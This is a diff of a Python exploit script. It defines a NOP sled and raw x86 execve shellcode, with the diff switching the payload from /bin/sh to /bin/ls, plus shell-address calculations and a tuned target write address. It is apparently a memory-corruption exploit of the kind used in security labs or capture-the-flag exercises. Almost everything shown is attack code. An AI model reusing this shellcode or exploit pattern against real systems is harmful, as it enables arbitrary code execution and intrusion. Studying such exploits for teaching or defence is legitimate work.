@@ -1,7 +1,7 @@
 import sys
 import os
 NOPSLED = b'\x90' * 0xC
-SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
+SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/ls"
 
 
 
@@ -22,7 +22,7 @@ ADDRESSOFSHELL4 = bytes(str(ADDRESSOFSHELL4), 'utf-8')
 #ADDRESSOFSHELL2 = int.from_bytes(ADDRESSOFSHELL[2:], 'big') - ADDRESSOFSHELL1 - 2540
 #ADDRESSOFSHELL1 = bytes(str(ADDRESSOFSHELL1), 'utf-8')
 #ADDRESSOFSHELL2 = bytes(str(ADDRESSOFSHELL2), 'utf-8')
-ADDRESSTOWRITE = b'007FFFFFFFD380'
+ADDRESSTOWRITE = b'007FFFFFFFD390'
 
 ADDRESSTOWRITE1 = int(ADDRESSTOWRITE, 16)
 ADDRESSTOWRITE1 = ADDRESSTOWRITE1.to_bytes(8, 'little')
